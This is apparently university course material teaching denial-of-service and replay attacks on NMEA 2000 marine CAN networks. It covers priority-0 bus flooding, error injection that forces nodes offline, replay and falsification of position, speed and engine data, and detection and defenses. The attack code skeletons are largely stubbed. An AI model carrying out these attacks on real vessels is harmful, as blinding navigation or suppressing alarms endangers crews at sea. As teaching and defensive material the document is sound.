---
title: "Class 07"
subtitle: "Denial of Service and Replay Attacks"
author: "Constantine Macris"
date: "2026"
titlepage: true
titlepage-color: "1E3A5F"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
description: |
    DoS and replay attack techniques on NMEA 2000 networks
---

# Class 07 -- Denial of Service and Replay Attacks

## Learning Outcomes

- Understand CAN bus arbitration vulnerabilities
- Execute bus flooding denial of service attacks
- Implement message replay attacks
- Analyze attack detectability
- Recognize network availability threats

## Definitions

- **DoS** -- Denial of Service - preventing legitimate access
- **Replay Attack** -- Recording and retransmitting captured messages
- **Bus Flooding** -- Overwhelming network with messages
- **Arbitration** -- CAN's collision resolution mechanism
- **Bus-off** -- Error state that disables a CAN node
- **Dominant/Recessive** -- CAN bus logic states (0 wins)

## Reading Assignment

- Literature Review: Section 2.2 (CAN Protocol)
- Literature Review: Section 4.1.2 (Entropy-Based Detection)
- CAN 2.0B specification (arbitration section)

## Why DoS on CAN Bus?

### Fundamental Vulnerability

CAN bus arbitration has a critical flaw:

- **Lower CAN ID wins** arbitration
- **0 (dominant)** beats **1 (recessive)**
- Attacker with ID 0x000 always wins

This means:
- High-priority attacks block all traffic
- Legitimate devices can be silenced
- No authentication means anyone can flood

### Impact on Maritime Systems

| System Blocked | Consequence |
|----------------|-------------|
| GPS/Position | Navigation blind |
| Heading | Autopilot fails |
| Engine data | No monitoring |
| Alarms | Safety systems disabled |
| AIS | Collision risk |

<!--
Instructor Notes:

CAN's arbitration was designed for reliability,
not security. The assumption was all nodes are trusted.

In automotive:
- DoS on braking CAN = vehicle can't stop
- Ford's CAN tested by researchers = 100% DoS success

In maritime:
- Same vulnerability
- But vessels can't pull over to the side
- Loss of nav/control at sea = potential disaster
-->

## CAN Arbitration Deep Dive

### How Arbitration Works

```
        Bit Time
         ─────►
Node A:  ┌───┐   ┌───┐   ┌───┐   ┌───┐
ID=0x500 │ 1 │ 0 │ 1 │ 0 │ 0 │ 0 │ 0 │ 0 │ ...
         └───┘   └───┘   └───┘   └───┘

Node B:  ┌───┐   ┌───┐   ┌───┐   ┌───┐
ID=0x300 │ 0 │ 1 │ 1 │ 0 │ 0 │ 0 │ 0 │ 0 │ ...
         └───┘   └───┘   └───┘   └───┘
             ▲
             │ B wins (0 beats 1)
             │ A backs off

Bus:     ┌───┐   ┌───┐   ┌───┐   ┌───┐
         │ 0 │ 1 │ 1 │ 0 │ 0 │ 0 │ 0 │ 0 │ ... B's message
         └───┘   └───┘   └───┘   └───┘
```

### Priority Attack

```python
# Lowest CAN ID = highest priority
# NMEA 2000 uses 29-bit extended IDs

# Normal navigation message (priority 2)
# PGN 129025, SA 36
normal_id = 0x09F80124  # Priority 2 in upper bits

# Attack message (priority 0)
# Use reserved PGN with priority 0
attack_id = 0x00000000  # Will always win arbitration!

# Even better: Use valid format with priority 0
# This may be more stealthy
stealth_attack_id = 0x00F80124  # Priority 0, same PGN
```

<!--
Instructor Notes:

The priority field in NMEA 2000 is 3 bits (0-7).
Lower number = higher priority.

Priority 0 = Network management
Priority 2 = Most navigation data
Priority 6 = Non-critical data

Attack approach:
1. Use priority 0 with any PGN
2. Flood at maximum rate
3. Legitimate traffic can't get through

Demo: Show arbitration on oscilloscope if available.
-->

## Bus Flooding Attack

### Basic Flood Implementation

```python
#!/usr/bin/env python3
"""
CAN Bus Flooding Attack
FOR EDUCATIONAL PURPOSES ON ISOLATED NETWORKS ONLY
"""
import time
import struct

class BusFloodAttack:
    def __init__(self, interface='can0'):
        self.interface = interface
        self.running = False

    def calculate_flood_rate(self, bitrate=250000, frame_bits=111):
        """
        Calculate maximum flood rate

        Args:
            bitrate: CAN bus speed (NMEA 2000 = 250kbps)
            frame_bits: Bits per frame (29-bit ID + 8 data + overhead)

        Returns:
            Maximum frames per second
        """
        # Extended frame: 29-bit ID, 8 bytes data
        # ~111 bits minimum with bit stuffing
        max_fps = bitrate / frame_bits
        return int(max_fps)  # ~2252 fps at 250kbps

    def flood_bus(self, can_id=0x00000000, duration_sec=10):
        """
        Flood CAN bus with high-priority frames

        WARNING: This will prevent ALL legitimate traffic!
        """
        max_rate = self.calculate_flood_rate()
        interval = 1.0 / max_rate

        print(f"Flood rate: {max_rate} fps")
        print(f"Duration: {duration_sec} seconds")
        print(f"CAN ID: {can_id:08X}")

        # Dummy payload
        data = bytes([0xFF] * 8)

        start_time = time.time()
        frame_count = 0

        while (time.time() - start_time) < duration_sec:
            # Send frame (pseudo-code)
            # can_send(self.interface, can_id, data)
            frame_count += 1
            time.sleep(interval)

        print(f"Sent {frame_count} frames")
        return frame_count

# Usage (on isolated test network only!)
# attack = BusFloodAttack('can0')
# attack.flood_bus(duration_sec=5)
```

### Flood Attack Variations

| Variation | Description | Detectability |
|-----------|-------------|---------------|
| Full flood | Maximum rate, ID 0x0 | Obvious |
| Targeted | Flood specific PGN's priority | Moderate |
| Burst | Periodic short floods | Lower |
| Shaped | Match normal traffic pattern | Lowest |

<!--
Instructor Notes:

Full flood is obvious but effective:
- Network goes silent except attacker
- All legitimate devices starved
- Easy to detect: unusual traffic spike

Targeted flood is more subtle:
- Only block specific device/PGN
- Other traffic appears normal
- Harder to detect without baseline

Lab exercise: Try different flood rates and
measure impact on legitimate traffic.
-->

## Error Injection Attack

### CAN Error Handling

CAN nodes have error counters:
- **TEC** - Transmit Error Counter
- **REC** - Receive Error Counter

If errors exceed threshold:
- 128+ errors = Error Passive state
- 256 errors = Bus-off state (node disabled!)

### Forcing Bus-off

```python
def error_injection_attack():
    """
    Inject errors to force target node bus-off

    Attack strategy:
    1. Send frame with same ID as target
    2. With different data (causes error)
    3. Target's TEC increments
    4. Repeat until TEC > 255
    5. Target goes bus-off (disabled)
    """

    # This requires precise timing
    # Must transmit simultaneously with target

    # Monitor for target's frame
    # Start transmitting same ID, different data
    # Target sees bit error, increments TEC

    # After ~32 successful attacks, target disabled
    pass
```

### Error Injection Detectability

| Indicator | Detection Method |
|-----------|------------------|
| Error frames on bus | Monitor error counters |
| Target goes silent | Device availability monitoring |
| Attacker retransmits | Same ID, different data pattern |

<!--
Instructor Notes:

Error injection is sophisticated:
- Requires precise timing
- Hard to execute reliably
- But effect is devastating

In automotive research:
- Successfully disabled ECUs
- Took < 1 second
- ECU required power cycle to recover

Maritime implications:
- Could disable GPS receiver
- Could disable autopilot
- Recovery requires physical access

This is a VERY advanced attack.
Most attackers use simpler flooding.
-->

## Replay Attacks

### What is a Replay Attack?

1. **Record** legitimate traffic
2. **Store** messages for later
3. **Replay** messages to achieve effect

### Why Replay Works

- No timestamps in NMEA 2000 messages
- No sequence numbers in most PGNs
- No authentication
- Receivers can't distinguish old from new

### Recording Traffic

```python
#!/usr/bin/env python3
"""
Traffic Recording for Replay Attack
"""
import time

class TrafficRecorder:
    def __init__(self):
        self.recordings = []

    def record(self, duration_sec=60, filter_pgns=None):
        """
        Record CAN traffic for replay

        Args:
            duration_sec: Recording duration
            filter_pgns: Optional list of PGNs to record
        """
        start_time = time.time()

        while (time.time() - start_time) < duration_sec:
            # Receive frame (pseudo-code)
            # can_id, data, timestamp = can_recv(interface)

            # Extract PGN
            # pgn = (can_id >> 8) & 0x3FFFF

            # Filter if specified
            # if filter_pgns and pgn not in filter_pgns:
            #     continue

            # Store with relative timestamp
            # self.recordings.append({
            #     'time_offset': timestamp - start_time,
            #     'can_id': can_id,
            #     'data': data
            # })
            pass

        print(f"Recorded {len(self.recordings)} frames")
        return self.recordings

    def save_recording(self, filename):
        """Save recording to file"""
        import json
        with open(filename, 'w') as f:
            json.dump(self.recordings, f)

    def load_recording(self, filename):
        """Load recording from file"""
        import json
        with open(filename, 'r') as f:
            self.recordings = json.load(f)
```

### Replaying Traffic

```python
class TrafficReplayer:
    def __init__(self, recordings):
        self.recordings = recordings

    def replay(self, speed=1.0, loop=False):
        """
        Replay recorded traffic

        Args:
            speed: Playback speed (1.0 = real-time)
            loop: Repeat recording continuously
        """
        while True:
            last_offset = 0

            for frame in self.recordings:
                # Calculate delay
                delay = (frame['time_offset'] - last_offset) / speed
                if delay > 0:
                    time.sleep(delay)

                # Send frame (pseudo-code)
                # can_send(interface, frame['can_id'], frame['data'])

                last_offset = frame['time_offset']

            if not loop:
                break

        print(f"Replayed {len(self.recordings)} frames")
```

<!--
Instructor Notes:

Replay attack scenario:

1. Attacker records vessel entering port
   - Low speed, steady heading
   - Specific position sequence

2. Later, vessel at sea in open water

3. Attacker replays port entry traffic
   - Chart plotter shows entering port
   - Autopilot may respond to old heading
   - AIS transmits old position

This is especially dangerous if:
- Crew trusts instruments over visual
- Low visibility conditions
- Automated systems respond

Defense: Include timestamps, sequence numbers,
or compare to external sensors.
-->

## Replay Attack Scenarios

### Scenario 1: Position History Manipulation

```python
def position_replay_attack():
    """
    Replay old position data to confuse navigation

    Record: Position when vessel at dock
    Replay: When vessel at sea

    Effect: Chart plotter shows at dock
            when actually miles away
    """
    # Record position PGN 129025 at dock
    # Wait until vessel underway
    # Replay dock position
    pass
```

### Scenario 2: Speed Manipulation

```python
def speed_replay_attack():
    """
    Replay slow speed during high speed transit

    Record: 5 knot speed in harbor
    Replay: During 20 knot cruise

    Effect: Incorrect ETA calculations
            Fuel consumption estimates wrong
    """
    pass
```

### Scenario 3: Engine Parameter History

```python
def engine_replay_attack():
    """
    Replay normal engine data during failure

    Record: Normal operating parameters
    Replay: During actual engine problem

    Effect: Alarms suppressed
            Crew unaware of issue
            Engine damage possible
    """
    pass
```

## Hybrid Attacks

### DoS + Spoofing

1. **Flood** legitimate device's PGN
2. **Inject** spoofed data at lower rate
3. Spoofed data is only data received

```python
def hybrid_dos_spoof_attack(target_pgn, spoofed_data):
    """
    Combine DoS with spoofing

    1. Identify target's source address
    2. Flood with higher priority to block target
    3. Send spoofed data as replacement
    """
    # Phase 1: Block legitimate source
    flood_can_id = (0 << 26) | target_pgn  # Priority 0
    flood_rate = 1000  # fps

    # Phase 2: Inject spoofed data
    spoof_can_id = (2 << 26) | target_pgn  # Normal priority
    spoof_rate = 10  # fps (normal rate)

    # Result: Only spoofed data gets through
    pass
```

### Replay + Modification

1. **Record** traffic
2. **Modify** specific fields
3. **Replay** altered traffic

```python
def modified_replay_attack(recordings):
    """
    Replay with modifications

    Example: Shift all positions 1nm north
    """
    for frame in recordings:
        pgn = (frame['can_id'] >> 8) & 0x3FFFF

        if pgn == 129025:  # Position
            # Modify latitude
            lat_raw = struct.unpack('<i', frame['data'][0:4])[0]
            lat_raw += int(1/60 / 1e-7)  # Add 1 minute (1nm)
            frame['data'][0:4] = struct.pack('<i', lat_raw)

    # Replay modified traffic
    pass
```

<!--
Instructor Notes:

Hybrid attacks are most sophisticated:
- Harder to detect
- More effective
- Require more planning

Real-world relevance:
- Stuxnet used similar hybrid approach
- Combined multiple techniques
- Evaded detection for years

Maritime implication:
- State-level attackers could use hybrid
- Commercial attackers more likely simple DoS
-->

## Detection Opportunities

### DoS Detection

| Indicator | Detection Method |
|-----------|------------------|
| Traffic spike | Rate monitoring |
| Priority anomaly | Track priority distribution |
| Device silence | Availability monitoring |
| Error frames | Error counter monitoring |

### Replay Detection

| Indicator | Detection Method |
|-----------|------------------|
| Stale timestamps | External time comparison |
| Position jumps | Kalman filter prediction |
| Duplicate sequences | Sequence tracking |
| Context mismatch | Cross-sensor validation |

### Detection Code Example

```python
class DoSDetector:
    def __init__(self, baseline_rate, threshold_multiplier=3):
        self.baseline = baseline_rate
        self.threshold = baseline_rate * threshold_multiplier
        self.window_count = 0
        self.window_start = time.time()

    def check_frame(self, can_id):
        """Check if current traffic indicates DoS"""
        self.window_count += 1

        # Check every second
        now = time.time()
        if now - self.window_start >= 1.0:
            rate = self.window_count
            self.window_count = 0
            self.window_start = now

            if rate > self.threshold:
                return True, f"DoS detected: {rate} fps (threshold: {self.threshold})"

        # Check for suspicious priority 0
        priority = (can_id >> 26) & 0x7
        if priority == 0:
            return True, f"Priority 0 frame detected: {can_id:08X}"

        return False, None
```

## Defense Implications

### Network-Level Defenses

1. **Rate limiting** - Constrain messages per source
2. **Priority monitoring** - Alert on unusual priorities
3. **Allowlisting** - Only permit known CAN IDs
4. **Gateway filtering** - Block at network boundaries

### Device-Level Defenses

1. **Sequence numbers** - Detect replay
2. **Timestamps** - Detect stale data
3. **Authentication** - Verify source (future)
4. **Watchdog timers** - Detect silence

## Lab Preview: Week 8

In Lab 08, you will:

1. Execute bus flooding at various rates
2. Measure impact on legitimate traffic
3. Record and replay navigation messages
4. Implement basic DoS detection
5. Document attack effectiveness

**Safety**: All activities on isolated test network only

## Homework

### Required

1. **Read**: Literature Review Section 4.1.2 (Entropy Detection)
2. **Calculate**:
   - Maximum frame rate at 250 kbps
   - Minimum time to fill CAN ID space
3. **Analyze**: How would you detect your own replay attack?

### Suggested

- Research: CAN bus error handling states
- Review: NMEA 2000 priority assignments
- Consider: What legitimate traffic uses priority 0?

## Discussion Questions

1. Why can't CAN devices ignore flooded traffic?
2. How could timestamp validation prevent replay attacks?
3. What is the impact of DoS on safety-critical systems?
4. Should NMEA 2000 implement rate limiting?

## References

- [CAN 2.0B Specification]
- [NMEA 2000 Priority Guidelines]
- [Automotive CAN Security Research]

[CAN 2.0B Specification]:https://www.bosch-semiconductors.com/ip-modules/can-ip-modules/
[NMEA 2000 Priority Guidelines]:https://www.nmea.org
[Automotive CAN Security Research]:https://www.defcon.org
